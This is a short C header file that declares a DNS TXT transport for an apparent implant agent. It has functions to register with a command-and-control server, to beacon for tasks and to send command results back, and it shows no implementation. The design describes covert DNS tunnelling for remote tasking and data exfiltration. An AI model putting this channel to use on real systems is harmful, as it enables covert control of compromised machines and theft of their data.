#pragma once
#include "transport.h"

// Register with C2 via DNS TXT. Sets g_agent.agent_id. Returns 1 on success.
int transport_dns_register(void);

// Poll for tasks via DNS TXT. Returns heap-allocated array; *count set to number.
AgentTask* transport_dns_beacon(int *count);

// Send result via DNS TXT.
void transport_dns_send_result(long long task_id, const char *output, const char *error);
